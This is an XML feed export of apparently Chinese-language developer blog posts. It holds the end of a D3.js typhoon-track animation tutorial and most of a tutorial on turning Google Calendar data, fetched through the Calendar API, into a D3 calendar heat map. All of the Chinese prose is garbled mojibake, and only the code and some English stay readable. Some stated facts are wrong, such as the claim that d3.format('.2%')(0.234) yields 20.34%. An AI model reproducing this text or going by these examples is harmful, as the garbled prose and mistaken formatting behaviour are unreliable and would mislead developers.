Math.pow(pixelLocSource[1] - pixelLoc[1], 2));&#125;

å–å·§çš„é»æ˜¯ï¼Œåˆ©ç”¨å·²çŸ¥çš„ç¶“ç·¯åº¦è·é›¢ä¾†åšé‹ç®—ï¼š    Latitude: 1 deg &#x3D; 110.574 km    Longitude: 1 deg &#x3D; 111.320*cos(latitude) km &#x2F;&#x2F; è©²ç·¯åº¦ä¸Šæ¯ä¸€å€‹ç¶“åº¦çš„è·é›¢ç®—æ³•
pixelLocSource æ˜¯æ˜ å°„éå¾Œçš„ä¸­å¿ƒé»ä½ç½®ï¼Œ[longitude, latitude] å‰‡æ˜¯ä¸­å¿ƒé»çš„åŸå§‹ç¶“ç·¯åº¦ï¼Œè€Œ distance å°±æ˜¯æˆ‘å€‘è¦ç®—çš„æš´é¢¨åŠå¾‘ã€‚ç”±æ–¼æˆ‘å€‘ä¸¦ä¸éœ€è¦ç®—å‡ºçœŸæ­£åŠå¾‘å…§æ¯å€‹é»çš„ç¶“ç·¯åº¦ï¼Œæ‰€ä»¥é€™é‚Šæˆ‘åªæŠ“è©²ç·¯åº¦ä¸Šçš„ç²¾åº¦ä¾†åšæŠ•å½±è¨ˆç®—ï¼Œæ‰¾å‡ºè©²åŠå¾‘å¾Œçš„ç²¾åº¦ï¼Œå†å¥—ç”¨æ™®é€šçš„å…©é»è·é›¢å…¬å¼ã€‚
ï¼ˆå…¶å¯¦é€™æ˜¯æˆ‘æƒ³å‡ºä¾†æ¯”è¼ƒæš´åŠ›çš„è§£æ³•å•¦ï¼Œæ­¡è¿çŸ¥é“æœ‰æ›´ç°¡å–®æ›´å¥½çš„æ–¹å¼æ˜ å°„è·é›¢çš„æœ‹å‹å‘ŠçŸ¥æˆ‘ï¼éå¸¸æ„Ÿè¬ï¼‰
æœ€å¾Œçš„æˆæœï¼ˆå°‡ scale èª¿å¤§æ¯”è¼ƒçœ‹å¾—å‡ºä¾†åŠå¾‘è®ŠåŒ–ï¼‰ï¼š


çµè«–ï¼š
è¦è®“è·¯å¾‘åœ¨åœ°åœ–ä¸Šå‹•èµ·ä¾†ä¸¦ä¸å›°é›£ï¼Œè€Œä¸”é€é D3.js çš„è£œé–“å‡½å¼ä¹Ÿèƒ½è®“ä½ åœ¨è£œé–“éç¨‹ä¸­å·åšè¨±å¤šæ‰‹è…³ï¼Œåƒæ˜¯æˆ‘æœ€ä¸€é–‹å§‹çš„ç¯„ä¾‹ä¸­é‚„æœ‰å¤šåˆ¤æ–·è³‡æ–™çš„æ™‚é–“ï¼Œé‡å°ä¸åŒæ™‚é–“ç•™ä¸‹é¢±é¢¨åŠå¾‘ç¯„åœåœ–ç­‰ç­‰ã€‚æœ¬ç¯‡çš„é‡é»åœ¨æ–¼å¦‚ä½•å–®ç´”é€é D3.js v4 èˆ‡ svg çš„æ“ä½œä¾†è£½ä½œå‡ºåœ°åœ–ä¸Šçš„å‹•æ…‹ç·šæ®µï¼Œå…¶ä»–åƒæ˜¯åŸºæœ¬çš„ç¶“ç·¯åº¦ç·šæ®µ (graticule) ç¤™æ–¼ç¯‡å¹…é—œä¿‚å°±ä¸ç´°è«‡ï¼Œç›¸ä¿¡å¤§å®¶å¯ä»¥å¾æˆ‘æœ€ä¸€é–‹å§‹çš„ç¯„ä¾‹ä¸­çœ‹å‡ºæ˜¯å¦‚ä½•è£½ä½œçš„ã€‚å¸Œæœ›æœ¬æ–‡èƒ½å°æƒ³ç”¨ svg ç¹ªè£½å‹•æ…‹è·¯ç·šåœ–çš„è®€è€…æœ‰æ‰€å¹«åŠ©ï¼Œè‹¥æ–‡ä¸­æœ‰ä»»ä½•éŒ¯èª¤ä¹Ÿæ­¡è¿æŒ‡æ­£ï¼
è³‡æ–™ä¾†æº
Natural Earth
topojson
How SVG Line Animation Works
SVG Paths and D3.js
TWEENING CUSTOM SHAPES AND PATHS IN D3.JS
SVG D3.js - ç¹ªè£½ç·šæ®µ
D3.js Path Data Generator Line Example
v4 curve interpolation comparison

é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>d3</tag>
        <tag>map</tag>
        <tag>animation</tag>
        <tag>svg</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¸€èµ·ç”¨ Google Calendar èˆ‡ D3.js é€²è¡Œå¹´çµ‚å›é¡§å§ï¼</title>
    <url>/2017/12/12/d3v4-calendar-yearendreview/</url>
    <content><![CDATA[å‰è¨€å¤§æ¦‚æ˜¯åœ¨ 2016 å¹´åº•çš„æ™‚å€™ï¼Œæˆ‘æ•´å€‹äººçš„å¿ƒç†ç‹€æ…‹å¾ˆç³Ÿï¼Œä¸€ç›´è¦ºå¾—è‡ªå·±å°ç”Ÿæ´»çš„æŒæ§åŠ›éå¸¸ä½è½ï¼Œåº¸åº¸ç¢Œç¢Œçš„éè‘—æ¯ä¸€å¤©ï¼Œå»ä¸æ›‰å¾—è‡ªå·±çš„ç›®æ¨™åœ¨å“ªï¼Œå°ä»€éº¼éƒ½èˆˆè‡´ç¼ºç¼ºï¼Œä¼¼ä¹æŠŠç”Ÿæ´»éºå¤±äº†ã€‚
æˆ‘è©¦è‘—æƒ³å¾éå¾€æ—¥å¸¸ç”Ÿæ´»ä¸­çš„æ‰€ä½œæ‰€ç‚ºä¾†æ‰¾å‡ºä¸€äº›ç™¥çµé»ï¼Œçµæœç™¼ç¾è¨˜æ†¶æœ‰é™ï¼Œè¶Šæƒ³è¶Šè¦ºå¾—è‡ªå·±å¥½åƒä»€éº¼éƒ½æ²’å®Œæˆï¼Œæ¥è‘—å°±é€²å…¥ç„¡æ­¢ç›¡çš„è² é¢è¿´åœˆâ€¦
ç‚ºäº†æ‰“ç ´é€™æ¨£çš„å¿ƒç†ç‹€æ…‹ï¼Œæˆ‘å¾ 2017 å¹´çš„ä¸€æœˆé–‹å§‹è¨˜éŒ„è‡ªå·±æ¯å¤©çš„ç”Ÿæ´»ï¼Œå°‡ä¸€æ•´å¤©æ‰€åšçš„äº‹é …è¨˜éŒ„åœ¨ Google Calendar ä¸­ï¼Œæœ‰äº†é€™æ¨£çš„ç´€éŒ„å¾Œï¼Œæˆ‘æ¯é€±éƒ½æœƒå›é¡§ä¸€ä¸‹è‡ªå·±é€™ä¸€æ•´å€‹æ˜ŸæœŸæ‰€åšçš„äº‹æƒ…ï¼ŒèŠ±åœ¨å·¥ä½œã€é‹å‹•ã€å¨›æ¨‚ã€å­¸ç¿’ç­‰ç­‰çš„æ™‚é–“å¦‚ä½•ï¼Œè®“è‡ªå·±åœ¨è² é¢æƒ…ç·’æ»¿æ¼²æ™‚ï¼Œèƒ½çœ‹çœ‹è‡ªå·±å…¶å¯¦é‚„æ˜¯é”æˆäº†ä¸å°‘äº‹ï¼ŒåŒæ™‚ä¹Ÿèƒ½éš¨æ™‚è­¦æƒ•è‡ªå·±åœ¨æ™‚é–“ç®¡ç†èˆ‡å„ç¨®äº‹é …é–“çš„åˆ†é…æ˜¯å¦æœ‰éœ€è¦èª¿æ•´çš„éƒ¨åˆ†ã€‚
å¥½å•¦ï¼Œèªªç©¿äº†å°±æ˜¯ç”¨ Google Calendar å¯«æ—¥è¨˜ã€‚
è€Œç¾åœ¨åˆæ¥è¿‘å¹´åº•äº†ï¼Œåœ¨é€™è¿‘ä¹ä¸€å¹´çš„ç´€éŒ„ä¸­ï¼Œæˆ‘æƒ³æ‡‰è©²å¯ä»¥ä¾†åšå€‹ Year End Reviewï¼Œåˆ©ç”¨ D3 ä¾†å¹«åŠ©æˆ‘å°‡è¨˜éŒ„åœ¨ Google Calendar ä¸Šçš„è³‡æ–™è¦–è¦ºåŒ–å‡ºä¾†ï¼
å¤§è‡´çš„æƒ³æ³•æ˜¯å°‡ä¸åŒåˆ†é¡çš„è³‡æ–™æ•´ç†å‡ºä¾†ï¼Œç„¶å¾Œçœ‹çœ‹ æˆ‘åœ¨é€™ä¸€å¹´ç•¶ä¸­ï¼Œæ¯ä¸€å¤©èŠ±åœ¨æ¯ä¸€å€‹é¡åˆ¥çš„äº‹é …çš„ Heat Map æœƒæ˜¯é•·ä»€éº¼æ¨£å­ï¼Œä¸¦åŠ ä¸Šç°¡å–®çš„ Select box æ–¹ä¾¿åˆ‡æ›ã€‚
æˆæœæˆªåœ–å¦‚ä¸‹ï¼š

æœ‰èˆˆè¶£çš„å¯ä»¥é€£çµåˆ° bl.ocks çœ‹ Demo èˆ‡å®Œæ•´çš„ç¨‹å¼ç¢¼
è³‡æ–™è¦–è¦ºåŒ–çš„ç¬¬ä¸€æ­¥ï¼Œç•¶ç„¶æ˜¯å–å¾—è³‡æ–™Google å­˜äº†å¤šå°‘è³‡æ–™æƒ³å¿…å¤§å®¶éƒ½å¿ƒçŸ¥è‚šæ˜ï¼Œè€Œä»–è€å¤§å“¥ä¹Ÿæ˜¯é¡˜æ„æŠŠæˆ‘å€‘çš„è³‡æ–™é‚„çµ¦æˆ‘å€‘ï¼Œåªè¦é€£çµåˆ° Google Takeout å°±å¯ä»¥å°‡ä½ åœ¨ Google æœå‹™ä¸Šçš„è³‡æ–™å‰¯æœ¬ä¸‹è¼‰ä¸‹ä¾†ï¼š

æ—¢ç„¶æˆ‘è¦è¦–è¦ºåŒ–æˆ‘åœ¨ Google Calendar ä¸Šçš„è³‡æ–™ï¼Œç•¶ç„¶å°±æ˜¯é¸å– Calendar ä¾†ä¸‹è¼‰ï¼š

æˆ–è‘—ï¼Œä½ ä¹Ÿèƒ½ç›´æ¥å¾ Google Calendar åŒ¯å‡ºä½ çš„æ—¥æ›†ï¼š

ä»”ç´°çœ‹ä¸€ä¸‹ï¼Œé€™å…©ç¨®æ–¹å¼ä¸‹è¼‰åˆ°çš„è³‡æ–™å…¶æ ¼å¼éƒ½æ˜¯ iCalendarã€‚
æ˜¯ iCalendar åˆå¦‚ä½•å‘¢ï¼Ÿé€šç”¨çš„æ¨™æº–æ ¼å¼ä¸æ˜¯å¾ˆå¥½å—ï¼Ÿä»£è¡¨æˆ‘ä¹‹å¾Œè‹¥æ›æˆ Apple çš„ iCalï¼Œæˆ‘é€™æ¬¡çš„å°ˆæ¡ˆä¹Ÿèƒ½å¥—ç”¨ä¸Šå»è€¶ï¼
But!
åœ¨æˆ‘ç•¶åˆç´€éŒ„æ—¥æ›†æ™‚ï¼Œæˆ‘æ¯ä¸€é … item çš„è³‡è¨Šå¾ˆå°‘ï¼Œå°±åªæ˜¯å–®ç´”çš„å¡«å…¥ Summaryï¼Œä¸¦ä¸”ä¾ç…§åˆ†é¡çµ¦äºˆé¡è‰²ã€‚
è€Œåœ¨ iCalendar çš„æ¨™æº–ä¸­ï¼Œä¸¦æ²’æœ‰ Google Calendar çš„é¡è‰²è³‡è¨Šï¼Œæ‰€ä»¥æˆ‘åªå¥½å¿ç—›æ”¾æ£„é€™æ¢æ–¹ä¾¿çš„é“è·¯â€¦ï¼ˆé€™å‘Šè¨´æˆ‘å€‘åšäº‹é‚„æ˜¯ä¸èƒ½å¤ªæ‡¶ï¼‰
iCalendar çš„å…§å®¹å¤§æ¦‚é•·é€™æ¨£ï¼Œä»¥ BEGIN:VEVENT é–‹å§‹ï¼ŒEND:VEVENT ç‚ºæ­¢ï¼š
BEGIN:VEVENTDTSTART;VALUE=DATE:20171209DTEND;VALUE=DATE:20171210DTSTAMP:20171210T075750ZUID:839skadkfcd03812j3f0c030s0s@google.comCREATED:20171210T024308ZDESCRIPTION:LAST-MODIFIED:20171210T024310ZLOCATION:SEQUENCE:0STATUS:CONFIRMEDSUMMARY:é‹å‹•ï¼ˆä¸»ï¼šèƒŒï¼‰TRANSP:TRANSPARENTBEGIN:VALARMACTION:DISPLAYDESCRIPTION:This is an event reminderTRIGGER:-F0AB0H30C0DEND:VALARMBEGIN:VALARMACTION:EMAILDESCRIPTION:This is an event reminderSUMMARY:Alarm notificationATTENDEE:mailto:arvin0731@gmail.comTRIGGER:-F0AB0H30C0DEND:VALARMEND:VEVENT

æ—¢ç„¶æ˜¯ Googleï¼Œå°±æœƒæœ‰ APIæ²’è¾¦æ³•ç›´æ¥è¼‰åˆ°è³‡æ–™ï¼Œé‚£å°±å¾ API å–å¾—å§ï¼
Google æœ€æ£’çš„ä¸€é»å°±æ˜¯æœ‰ä¸€å † APIï¼Œè€Œç‚ºäººè©¬ç—…çš„å‰›å¥½æ˜¯é€™äº› API å¸¸å¸¸æ²’æœ‰å®Œå–„çš„ Docã€‚
å¹¸é‹çš„æ˜¯ï¼ŒGoogle Calendar API çš„æ–‡ä»¶é‚„è »å¥½æ‡‚çš„ï¼Œå› ç‚ºçµ¦äº†ä¸€å€‹ç›´æ¥å¯ä»¥è¤‡è£½ä¾†ç”¨çš„ç¯„ä¾‹ Sampleï¼ˆç¬‘
ç›´æ¥ç…§è‘—æ­¥é©Ÿåšå°±å¯ä»¥äº†ï¼Œä»–æœ‰å¾ˆå¤šå¯¦ä½œç‰ˆæœ¬ï¼Œæˆ‘æ˜¯ç”¨ç†Ÿæ‚‰çš„ Node.js ä¾†å¹«æˆ‘çˆ¬å–è³‡æ–™ã€‚
å”¯ä¸€è¦æ³¨æ„çš„æ˜¯æ­¥é©Ÿä¸€ä¸­çš„ this wizard è¦å¥½å¥½ç…§è‘—èªªæ˜åŸ·è¡Œï¼Œå³ä¾¿ä»–æ­¥é©Ÿçœ‹èµ·ä¾†æœ‰äº›åŒªå¤·æ‰€æ€ï¼Œåƒæ˜¯è¦ä½ åˆ°æŸä¸€é å¾ŒæŒ‰ä¸‹ Cancel button (eg. On the Add credentials to your project page, click the Cancel button.)
ç•¶ä½ è¨­å®šå¥½ä¸€åˆ‡ï¼Œå–å¾— OAuth2 éœ€è¦çš„ credentials å¾Œï¼Œå¯ä»¥åƒç…§ä»–ä¸‹é¢çš„ç¯„ä¾‹ä¾æ“šä½ æƒ³è¦çš„è³‡æ–™ä½œä¿®æ”¹ï¼Œæ¯”è¼ƒé—œéµçš„ç¨‹å¼æ˜¯é€™å¹¾è¡Œï¼š
var calendar = google.calendar(&#x27;v3&#x27;);var queryOptions = &#123;    auth: auth,    calendarId: &#x27;primary&#x27;,    timeMax: (new Date()).toISOString(),    singleEvents: true,    orderBy: &#x27;startTime&#x27;,    maxResults: 2500 // ä¸çµ¦ maxResults çš„è©±ï¼Œé è¨­å€¼å°±æ˜¯ 2500&#125;;if (pageToken) &#123;    queryOptions.pageToken = pageToken;&#125;calendar.events.list(queryOptions, function (err, response) &#123;    // ... å¾ response ä¸­å–å¾—éœ€è¦çš„è³‡æ–™    // var events = response.items;&#125;

æˆ‘å€‘ä½¿ç”¨çš„æ˜¯ v3 çš„ google calendar apiï¼Œåˆ©ç”¨ calendar.events.list å¯ä»¥å–å¾—æŸå€‹ Calendar çš„ events åˆ—è¡¨ï¼Œåœ¨ queryOptions ä¸­ï¼Œæ¯”è¼ƒé‡è¦çš„æœ‰ä¸‹é¢å¹¾å€‹:
auth å°±æ˜¯ä½ åœ¨ this wizard ä¸­ç”¢ç”Ÿçš„ credentialsï¼Œä½ åœ¨é é¢ä¸Šå°±èƒ½æ‰¾åˆ°ä¸‹è¼‰ json çš„é€£çµï¼š

calendarId æ˜¯ä½ æƒ³æŠ“å–çš„ Calendar åç¨±ï¼Œprimary æŒ‡çš„æ˜¯ä½ ç™»å…¥å¸³è™Ÿçš„ä¸»è¦æ—¥æ›†ã€‚
timeMax (or timeMin) å¯ä»¥ç”¨ä¾†è¦ç¯„ä½ æƒ³æŠ“å–å“ªæ®µæ™‚é–“å…§çš„ eventsã€‚
æœ€å¾Œæ˜¯ pageTokenï¼Œç”±æ–¼ Google Calendar API æœ‰é™åˆ¶ï¼Œä½ ä¸€æ¬¡æœ€å¤šåªèƒ½æŠ“å– 2500 å€‹ eventsï¼Œå³ä¾¿ä½ æœ‰è¨­å®š maxResults é€™å€‹åƒæ•¸ä¹Ÿä¸€æ¨£ã€‚å› æ­¤ä½ æœƒéœ€è¦é€éæ¯æ¬¡ API request å›å‚³çš„ nextPageToken ä¾†é€²è¡Œä¸‹ä¸€é çš„ Queryã€‚ï¼ˆæ²’éŒ¯ï¼Œresponse å›ä¾†çš„æ˜¯ nextPageTokenï¼Œä½†ä½ ä¸‹ Query æ™‚å¸¶çš„æ˜¯ pageTokenï¼Œè«‹æ³¨æ„ï¼ï¼‰
å¯ä»¥è¨­å®šçš„åƒæ•¸é‚„éå¸¸å¤šï¼Œå¯ä»¥å¾ Google æä¾›çš„ API Explorer ä¸­é¸å– Calendar API ä¾†æ¸¬è©¦çœ‹çœ‹å“ªæ¨£çš„åƒæ•¸æ˜¯ä½ éœ€è¦çš„ï¼æ¯å€‹åƒæ•¸éƒ½æœ‰å°æ‡‰çš„èªªæ˜ï¼Œé‚„ç®—æ¸…æ¥šã€‚
æˆ‘åœ¨é€™éƒ¨åˆ†çš„å¯¦ä½œæ”¾åœ¨ Gist ä¸Šï¼Œæœ‰èˆˆè¶£å¯ä»¥åƒè€ƒï¼Œå¯«å¾—å¾ˆæš´åŠ›ç°¡é™‹ï¼Œç•¢ç«Ÿé€™ä¸æ˜¯é€™æ¬¡çš„é‡é»ï½
ä¸»è¦æ˜¯ä¾ç…§æ—¥æ›†ä¸­æ¯ç­† Event çš„æ™‚é–“èˆ‡é¡è‰²åšåˆ†é¡èˆ‡çµ±è¨ˆï¼Œä¾ç…§ä¸åŒé¡è‰²ï¼ˆä¹Ÿå°±æ˜¯ä¸åŒé¡åˆ¥ï¼‰åˆ†åˆ¥å­˜æ”¾åˆ°ä¸åŒæª”æ¡ˆã€‚
è³‡æ–™æ ¼å¼ä¹Ÿå¾ˆç°¡å–®ï¼š
date,colorIdNum2017-10-10,12017-10-11,12017-10-12,12017-10-13,12017-10-14,12017-10-15,1......

è³‡æ–™æœ‰äº†çµ‚æ–¼èƒ½é–‹å§‹ç•«åœ–äº†ï¼ä¸»è¦åƒè€ƒ Mike Bostock å¤§ç¥çš„ä½œå“ï¼Œæ”¹æˆåªç¹ªè£½å–®ä¸€å¹´åº¦åœ–è¡¨ï¼Œä¸¦åŠ ä¸Šåˆ‡æ›è³‡æ–™å¾Œçš„å‹•ç•«ã€‚
æ¥ä¸‹ä¾†æ˜¯æ‰‹æŠŠæ‰‹èªªæ˜ï¼š
æˆ‘å€‘ç¸½å…±éœ€è¦ä¸‰å€‹ Functionï¼šDrawCalendarã€UpdateCalendar èˆ‡ changeDataSrcï¼Œåˆ†åˆ¥ç”¨ä¾†ç¹ªè£½åœ–è¡¨ã€æ›´æ–°åœ–è¡¨èˆ‡æ›´æ–°è³‡æ–™ã€‚
æœ€ä¸»è¦çš„ç•¶ç„¶å°±æ˜¯ DrawCalendarã€‚ç¹ªè£½æ—¥æ›†åˆå¯åˆ†ç‚ºä¸‰å€‹æ­¥é©Ÿï¼š
Steps I: è¨­å®šæ—¥æ›†åŸºæœ¬å¤–è§€ï¼ˆå¤§å°ã€é¡è‰²ã€svg containerï¼‰function DrawCalendar(dataSrc) &#123;  var width = 960,      height = 136,      cellSize = 17;  var formatPercent = d3.format(&quot;d&quot;);  var color = d3.scaleQuantize()      .domain([0, 10])      .range([&quot;#006837&quot;, &quot;#1a9850&quot;, &quot;#66bd63&quot;, &quot;#a6d96a&quot;, &quot;#d9ef8b&quot;, &quot;#ffffbf&quot;, &quot;#fee08b&quot;, &quot;#fdae61&quot;, &quot;#f46d43&quot;, &quot;#d73027&quot;, &quot;#a50026&quot;]);  // ...  // ..  // .&#125;

ä¸Šé¢é€™æ®µå¾ˆå–®ç´”çš„å°±æ˜¯è¨­ç½®å¥½åœ–è¡¨çš„åŸºæœ¬è³‡è¨Šï¼ŒåŒ…å«å¯¬ã€é«˜èˆ‡æ—¥æ›†ä¸­æ¯â€å¤©â€çš„æ ¼å­å¤§å°ï¼Œåˆ©ç”¨ d3.scaleQuantize() å‰µå»ºä¸€å€‹ color å‡½æ•¸ï¼Œç”¨ä¾†å°‡ä¹‹å¾Œçš„è³‡æ–™æ˜ å°„åˆ°å°æ‡‰çš„é¡è‰²ã€‚
é€™é‚Šæœ‰å€‹ d3.format(&quot;d&quot;) çš„å‡½æ•¸ï¼Œå…¶å¯¦åœ¨é€™é‚Šç”¨ä¸åˆ°ï¼Œä½†é‚„æ˜¯æƒ³ä»‹ç´¹ä¸€ä¸‹ã€‚d3.format() æ˜¯å€‹æ–¹ä¾¿ä½ æ­£è¦åŒ–è³‡æ–™æ•¸å€¼çš„å‡½å¼ï¼Œä¾‹å¦‚ä½ æƒ³å°‡æ•¸å€¼ä¾·é™åœ¨å°æ•¸é»å¾Œå…©ä½ï¼Œå°±å¯ä»¥ç”¨ d3.format(&quot;2f&quot;)ï¼Œæˆ–æ˜¯æƒ³è½‰æ›æˆç™¾åˆ†æ¯”ï¼Œå¯ä»¥ç”¨ d3.format(&quot;.2%&quot;)ï¼Œé€™æ¨£æœƒå°‡ä½ è¼¸å…¥çš„æ•¸å€¼ä¹˜ä¸Š 100 å¾Œï¼Œå†åŠ ä¸Šç™¾åˆ†æ¯”ç¬¦è™Ÿï¼Œä¸¦ä¾ç…§ % å‰çš„æ•¸å­—ä¾†æ±ºå®šå°æ•¸é»å¾Œçš„ä½æ•¸ã€‚
eg. d3.format(â€œ.2%â€)(0.234) &#x3D;&#x3D;&#x3D; 20.34% (å¯åƒè€ƒæ­¤ç¶²ç«™èªªæ˜)
æ¥è‘—æ˜¯ç¹ªè£½ä¸»è¦çš„ calendar chart svg containerï¼š
var svg = d3.select(&quot;#calendar-chart&quot;)      .selectAll(&quot;svg&quot;)      .data(d3.range(2017, 2018))      .enter().append(&quot;svg&quot;)      .attr(&quot;width&quot;, width)      .attr(&quot;height&quot;, height)      .append(&quot;g&quot;)      .attr(&quot;transform&quot;, &quot;translate(&quot; + ((width - cellSize * 53) / 2) + &quot;,&quot; + (height - cellSize * 7 - 1) + &quot;)&quot;);  svg.append(&quot;text&quot;)      .attr(&quot;transform&quot;, &quot;translate(-6,&quot; + cellSize * 3.5 + &quot;) rotate(-90)&quot;)      .attr(&quot;font-family&quot;, &quot;sans-serif&quot;)      .attr(&quot;font-size&quot;, 10)      .attr(&quot;text-anchor&quot;, &quot;middle&quot;)      .text(function (d) &#123; return d; &#125;);

d3.range() æœƒå›å‚³æ ¹æ“šä½ å‚³å…¥çš„å€é–“ï¼Œå›å‚³ä¸€æ®µé€£çºŒæ•¸å€¼é™£åˆ—ã€‚
æˆ‘å€‘åˆ©ç”¨ d3.range(2017, 2018) å–å¾—é™£åˆ—è³‡æ–™ï¼Œæœƒå›å‚³é•·åº¦ç‚ºä¸€ï¼ŒåŒ…å« 2017 é€™å€‹æ•¸å€¼çš„é™£åˆ— [2017]ã€‚
ä½ å¯èƒ½æœƒæƒ³ï¼Œç‚ºä»€éº¼æˆ‘è¦é€™æ¨£åšï¼Ÿ
åªéœ€è¦ä¸€å¹´çš„è³‡æ–™ï¼Œå°±ç›´æ¥ append svg å°±å¥½å‘€ï¼Œä½•å¿… binding 2017 é€™å€‹å€¼åˆ° svg çš„ __data__ è£¡é¢å‘¢ï¼Ÿ
è³£å€‹é—œå­ï¼Œå¾…æœƒçœ‹åˆ° Steps II ä½ å°±æœƒçŸ¥é“äº†ï¼
è€Œå‰©ä¸‹çš„éƒ¨åˆ†å°±æ˜¯åˆ©ç”¨ transform ä¾†ä½ç§» svgï¼Œç‚ºæ•´å€‹åœ–è¡¨ä¿ç•™ç©ºé–“ï¼Œä¸¦åŠ ä¸Šæ–‡å­—æ¨™è¨˜ã€‚
Steps II: ç¹ªè£½æ—¥æ›†ä¸­çš„æ¯ä¸€å¤©ï¼ˆä¹Ÿå°±æ˜¯æ¯å€‹å°æ ¼å­å•¦ï½ï¼‰var rect = svg.append(&quot;g&quot;)  .attr(&quot;fill&quot;, &quot;none&quot;)  .attr(&quot;stroke&quot;, &quot;#ccc&quot;)  .selectAll(&quot;rect&quot;)  .data(function (d) &#123; return d3.timeDays(new Date(d, 0, 1), new Date(d + 1, 0, 1)); &#125;)  .enter().append(&quot;rect&quot;)  .attr(&quot;width&quot;, cellSize)  .attr(&quot;height&quot;, cellSize)  .attr(&quot;x&quot;, function (d) &#123; return d3.timeWeek.count(d3.timeYear(d), d) * cellSize; &#125;)  .attr(&quot;y&quot;, function (d) &#123; return d.getDay() * cellSize; &#125;)  .datum(d3.timeFormat(&quot;%Y-%m-%d&quot;));  svg.append(&quot;g&quot;)    .attr(&quot;fill&quot;, &quot;none&quot;)    .attr(&quot;stroke&quot;, &quot;#000&quot;)    .selectAll(&quot;path&quot;)    .data(function (d) &#123; return d3.timeMonths(new Date(d, 0, 1), new Date(d + 1, 0, 1)); &#125;)    .enter().append(&quot;path&quot;)    .attr(&quot;d&quot;, pathMonth);

è¦ç¹ªè£½å‡ºä¸€å¹´ä¸­çš„ â€œæ¯ä¸€å¤©â€ï¼Œæˆ‘å€‘å¯ä»¥ç›´æ¥ for loop è·‘ 365 æ¬¡ï¼Œæˆ–æ˜¯ç”¢ç”Ÿ 365 ç­†è³‡æ–™ï¼Œä½†æ›´è°æ˜çš„åšæ³•æ˜¯åˆ©ç”¨ d3-time æä¾›çš„ timeDays å‡½æ•¸ ä¾†å¹«æˆ‘å€‘ç”¢ç”Ÿå‡ºç‰¹å®šæ—¥æœŸå€é–“çš„æ—¥æœŸè³‡æ–™ï¼
d3.timeDays(new Date(d, 0, 1), new Date(d + 1, 0, 1));
å…¶ä¸­ new Date() çš„ç¬¬ä¸€å€‹åƒæ•¸ d ä»£è¡¨å¹´ï¼Œ0 ä»£è¡¨ç¬¬ä¸€å€‹æœˆï¼ˆæœˆä»½å¾ 0 é–‹å§‹ï¼‰ï¼Œ1 å‰‡æ˜¯ç¬¬ä¸€å¤©ï¼Œå› æ­¤é€™é‚Šæœƒå›å‚³ d å¹´åˆ° d + 1 å¹´é–“çš„æ¯ä¸€å¤©ã€‚
å¥½é‚£å•é¡Œä¾†äº†ï¼Œé€™å€‹ d æ˜¯ä»€éº¼å‘¢ï¼Ÿ
è¦å›ç­”é€™å€‹å•é¡Œï¼Œå¿…é ˆå…ˆäº†è§£ä¸€ä¸‹ d3 ä¸­çš„ selection.data()ã€‚
æˆ‘ä»¥å‰éƒ½ä»¥ç‚º data() åªèƒ½å¤ ä¸Ÿå…¥è³‡æ–™é™£åˆ—ï¼Œä½†æ˜¯åœ¨é€™æ¬¡çš„å¯¦ä½œéç¨‹ä¸­æ‰ç™¼ç¾ï¼ŒåŸä¾†ä»–å¯ä»¥æ¥å—å‡½æ•¸ï¼
ä½†ä»–æ˜¯æ€éº¼é‹ä½œçš„å‘¢ï¼Ÿæˆ‘å€‘å·çœ‹ä¸€ä¸‹ d3-selection çš„åŸå§‹ç¢¼

çœŸçš„è »æœ‰è¶£çš„ï¼Œä»–å…¶å¯¦æ˜¯å…ˆåˆ¤æ–·ä½ å‚³å…¥çš„ value æ˜¯ä¸æ˜¯å‡½æ•¸ï¼Œè‹¥ä¸æ˜¯ï¼Œæœƒå…ˆåˆ©ç”¨ constants() å°‡ä½ çš„å€¼åŒ…è£¹éï¼Œè®“ä»–è®Šæˆå¯åŸ·è¡Œçš„å‡½æ•¸ï¼š
constants.jsexport default function(x) &#123;  return function() &#123;    return x;  &#125;;&#125;

ä»–æœƒå°‡ parent.__data__ å‚³å…¥è©²å‡½æ•¸ä¸­åŸ·è¡Œï¼Œå›å‚³çš„å°±æœƒæ˜¯è©² selector çš„ __data__ã€‚æ‰€ä»¥ç›´æ¥å‚³å…¥ function ä¹Ÿæ˜¯å¯è¡Œçš„ï¼
ä»¥æˆ‘å€‘çš„ä¾‹å­ä¾†èªªï¼Œrect çš„ parent å°±æ˜¯ svgï¼Œè€Œä½ å€‘è¨˜å¾—åœ¨ Steps I æ™‚ï¼Œæˆ‘å€‘ binding é™£åˆ— [2017] åˆ° svg çš„ __data__ ä¸­å—ï¼Ÿé€™é‚Šå°±æ´¾ä¸Šç”¨å ´äº†ï¼åœ¨ rect çš„ data() ä¸­çš„å‡½æ•¸æ‰€æ¥æ”¶åˆ°çš„ d å€¼å°±æ˜¯ 2017ã€‚
è€Œä¸Šè¿°çš„ d3.timeDays(new Date(d, 0, 1), new Date(d + 1, 0, 1)); å°±æœƒå›å‚³ 2017 åˆ° 2018 ä¸­é–“ 365 ç­†çš„æ—¥æœŸè³‡æ–™ï¼æˆ‘å€‘ä¹Ÿå› æ­¤å¾—åˆ° 365 å€‹å°æ–¹å¡Šå•¦ï¼
æ¥è‘—ï¼Œåˆ©ç”¨é¡ä¼¼çš„æ¦‚å¿µï¼Œä½¿ç”¨ d3.timeMonths() ç”¢ç”Ÿ 12 ç­†æœˆä»½è³‡æ–™ï¼Œæ¥è‘—å¯¦ä½œ pathMonth() ä¾†ç•«å‡º svg pathï¼š
pathMonth()function pathMonth(t0) &#123;  var t1 = new Date(t0.getFullYear(), t0.getMonth() + 1, 0),    d0 = t0.getDay(), w0 = d3.timeWeek.count(d3.timeYear(t0), t0),    d1 = t1.getDay(), w1 = d3.timeWeek.count(d3.timeYear(t1), t1);  return &quot;M&quot; + (w0 + 1) * cellSize + &quot;,&quot; + d0 * cellSize    + &quot;H&quot; + w0 * cellSize + &quot;V&quot; + 7 * cellSize    + &quot;H&quot; + w1 * cellSize + &quot;V&quot; + (d1 + 1) * cellSize    + &quot;H&quot; + (w1 + 1) * cellSize + &quot;V&quot; + 0    + &quot;H&quot; + (w0 + 1) * cellSize + &quot;Z&quot;;&#125;

é€™æ®µé‚è¼¯çœ‹ä¼¼è¤‡é›œï¼Œå…¶å¯¦å¾ˆç›´è¦ºã€‚
